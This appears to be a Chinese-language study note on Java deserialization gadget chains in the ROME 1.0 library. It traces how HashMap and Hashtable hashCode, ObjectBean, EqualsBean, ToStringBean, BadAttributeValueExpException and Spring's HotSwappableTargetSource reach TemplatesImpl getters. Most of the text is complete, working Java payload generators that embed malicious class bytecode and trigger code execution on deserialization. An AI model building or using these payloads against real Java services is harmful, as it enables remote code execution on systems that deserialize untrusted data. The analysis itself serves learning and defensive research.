# 写在前面
感谢大师傅：[https://goodapple.top/archives/1145](https://goodapple.top/archives/1145)
[https://www.yuque.com/jinjinshigekeaigui/qskpi5/cz1um4](https://www.yuque.com/jinjinshigekeaigui/qskpi5/cz1um4)
# 
# 导入依赖
```go
 <dependencies>
        <dependency>
            <groupId>rome</groupId>
            <artifactId>rome</artifactId>
            <version>1.0</version>
        </dependency>
    </dependencies>
```
 
# 链子分析
## hashmap
```go
putVal(hash(key), key, value, false, false);
```
```go
static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

```
hashcode调用，不多说了。
找一个恶意类的hashcode方法。
## objectbean
```go
public int hashCode() {
        return this._equalsBean.beanHashCode();
    }
```
```go
public int beanHashCode() {
        return this._obj.toString().hashCode();
    }
```
由tostring引发的惨案。

```go
public String toString() {
        return this._toStringBean.toString();
    }
}
```
## toStringBean
```go
public String toString() {
        Stack stack = (Stack)PREFIX_TL.get();
        String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek());
        String prefix;
        if (tsInfo == null) {
            String className = this._obj.getClass().getName();
            prefix = className.substring(className.lastIndexOf(".") + 1);
        } else {
            prefix = tsInfo[0];
            tsInfo[1] = prefix;
        }

        return this.toString(prefix);
    }
```
```go
private String toString(String prefix) {
        StringBuffer sb = new StringBuffer(128);

        try {
            PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);
            if (pds != null) {
                for(int i = 0; i < pds.length; ++i) {
                    String pName = pds[i].getName();
                    Method pReadMethod = pds[i].getReadMethod();
                    if (pReadMethod != null && pReadMethod.getDeclaringClass() != Object.class && pReadMethod.getParameterTypes().length == 0) {
                        Object value = pReadMethod.invoke(this._obj, NO_PARAMS);
                        this.printProperty(sb, prefix + "." + pName, value);
                    }
                }
            }
        } catch (Exception var8) {
            sb.append("\n\nEXCEPTION: Could not complete " + this._obj.getClass() + ".toString(): " + var8.getMessage() + "\n");
        }
```
触发getter，
打一个getoutproperties。
# 手写payload
## 后半段调用：
```go
package org.example;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;


public class Main {
    public static void Reflection(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(evilref.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        Reflection(templates,"_name","enterprise");
        Reflection(templates,"_bytecodes",new byte[][]{code});
        Reflection(templates,"_tfactory",new TransformerFactoryImpl());
        Class tcl = Templates.class;

        ToStringBean bean = new ToStringBean(tcl,templates);
        bean.toString();
    }
}
```
## 联动前面的
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class Main {
    public static void Reflection(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(evilref.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();/**/
        Reflection(templates,"_name","enterprise");
        Reflection(templates,"_bytecodes",new byte[][]{code});
        Reflection(templates,"_tfactory",new TransformerFactoryImpl());
        Class tcl = Templates.class;
        ToStringBean bean = new ToStringBean(tcl,templates);
        ToStringBean fakebean = new ToStringBean(String.class,"aa");
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,fakebean);



        Map mymap = new HashMap();
        mymap.put(equalsBean,"aa");
        Reflection(equalsBean,"_obj",bean);
        serialize_func.serialize(mymap);
        serialize_func.unserialize("ser.bin");



        //        bean.toString();




    }
}
```
养成个习惯，为了防止put调用出错，需要后面反射时再把我们的恶意类放上去，防止报错提前出错。
# 其它链
后半段相对比较固定，只有前面hashcode反序列化入口的选择会发生些变化。
## ObjectBean利用链
```java

public ObjectBean(Class beanClass,Object obj,Set ignoreProperties) {
        _equalsBean = new EqualsBean(beanClass,obj);
        _toStringBean = new ToStringBean(beanClass,obj);
        _cloneableBean = new CloneableBean(obj,ignoreProperties);
    }


public ObjectBean(Class beanClass,Object obj) {
        this(beanClass,obj,null);
    }

public int hashCode() {
        return _equalsBean.beanHashCode();
    }
```
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class objec_bean {
    public static void Reflection(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(evilref.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();/**/
        Reflection(templates, "_name", "enterprise");
        Reflection(templates, "_bytecodes", new byte[][]{code});
        Reflection(templates, "_tfactory", new TransformerFactoryImpl());
        Class tcl = Templates.class;
        ToStringBean bean = new ToStringBean(tcl, templates);
        ToStringBean fakebean = new ToStringBean(String.class, "aa");
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, bean);


        Map mymap = new HashMap();
        mymap.put(objectBean, "aa");
        //Reflection(objectBean, "_toStringBean", bean);
        serialize_func.serialize(mymap);
        serialize_func.unserialize("ser.bin");
    }}
```
弹两次计算器，优化一下：
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class objec_bean {
    public static void Reflection(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(evilref.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();/**/
        Reflection(templates, "_name", "enterprise");
        Reflection(templates, "_bytecodes", new byte[][]{code});
        Reflection(templates, "_tfactory", new TransformerFactoryImpl());
        Class tcl = Templates.class;
        ToStringBean bean = new ToStringBean(tcl, templates);
        ToStringBean fakebean = new ToStringBean(String.class, "aa");
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, fakebean);


        Map mymap = new HashMap();
        mymap.put(objectBean, "aa");
        Reflection(objectBean, "_toStringBean", new ToStringBean(ToStringBean.class,bean));//
        Reflection(objectBean, "_equalsBean", new EqualsBean(ToStringBean.class,bean));
        serialize_func.serialize(mymap);
        serialize_func.unserialize("ser.bin");
    }}
```
```java
Reflection(objectBean, "_toStringBean", new ToStringBean(ToStringBean.class,bean));
Reflection(objectBean, "_toStringBean", bean);
```
这两种写法都可以。
## hashtable
```java
private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Compute new size with a bit of room 5% to grow but
        // no larger than the original size.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // synch could be eliminated for performance
            reconstitutionPut(table, key, value);
        }
    }
```
调用reconstitutionPut
```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = .hashCode();
```
hashmap换hashtable：
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;


public class hash_tab {
    public static void Reflection(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(evilref.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();/**/
        Reflection(templates, "_name", "enterprise");
        Reflection(templates, "_bytecodes", new byte[][]{code});
        Reflection(templates, "_tfactory", new TransformerFactoryImpl());
        Class tcl = Templates.class;
        ToStringBean bean = new ToStringBean(tcl, templates);
        ToStringBean fakebean = new ToStringBean(String.class, "aa");
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, fakebean);

        Hashtable mymap = new Hashtable();
        mymap.put(objectBean, "aa");
        Reflection(objectBean, "_toStringBean", new ToStringBean(ToStringBean.class,bean));
        Reflection(objectBean, "_equalsBean", new EqualsBean(ToStringBean.class,bean));
        serialize_func.serialize(mymap);
        serialize_func.unserialize("ser.bin");
    }}
```
用equalbean或objectbean都行。

## BadAttributeValueExpException
```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
 }
```
直接就触发tostring了。
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;

public class badattr {
    public static void Reflection(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args)throws Exception{
        byte[] code = ClassPool.getDefault().get(evilref.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();/**/
        Reflection(templates, "_name", "enterprise");
        Reflection(templates, "_bytecodes", new byte[][]{code});
        Reflection(templates, "_tfactory", new TransformerFactoryImpl());

        ToStringBean bean = new ToStringBean(Templates.class, templates);
        //ToStringBean fakebean = new ToStringBean(String.class, "aa");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        Reflection(badAttributeValueExpException,"val",bean);
        serialize_func.serialize(badAttributeValueExpException);
        serialize_func.unserialize("ser.bin");

    }
}

```
构造函数里面触发toString，会影响实例化。
## HotSwappableTargetSource
一个spring原生依赖
equals方法：
```java
public boolean equals(Object other) {
        return this == other || other instanceof HotSwappableTargetSource && this.target.equals(((HotSwappableTargetSource)other).target);
    }
```
```java
public boolean equals(XObject obj2)
  {

    // In order to handle the 'all' semantics of
    // nodeset comparisons, we always call the
    // nodeset function.
    int t = obj2.getType();
    try
    {


return xstr().equals(obj2.xstr());
```
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;

public class howswap {
    public static void Reflection(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        byte[] code = ClassPool.getDefault().get(evilref.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();/**/
        Reflection(templates,"_name","enterprise");
        Reflection(templates,"_bytecodes",new byte[][]{code});
        Reflection(templates,"_tfactory",new TransformerFactoryImpl());
        Class tcl = Templates.class;
        ToStringBean bean = new ToStringBean(tcl,templates);

        ToStringBean fakebean = new ToStringBean(String.class,"aa");
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(fakebean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));




        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(h1,h1);
        hashMap.put(h2,h2);
        Class refhot = h1.getClass();
        Field tarfield = refhot.getDeclaredField("target");
        tarfield.setAccessible(true);
        tarfield.set(h1,bean);


        serialize_func.serialize(hashMap);
        serialize_func.unserialize("ser.bin");
    }
}

```
